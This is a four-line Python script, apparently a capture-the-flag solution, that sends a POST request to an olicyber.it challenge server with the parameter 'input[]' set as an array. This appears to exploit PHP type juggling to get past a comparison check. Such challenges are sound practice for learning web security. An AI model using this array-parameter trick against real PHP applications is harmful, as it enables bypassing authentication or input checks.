import requests
url = 'http://soundofsilence.challs.olicyber.it/'
r = requests.post(url, data={'input[]':''})
print(r.text)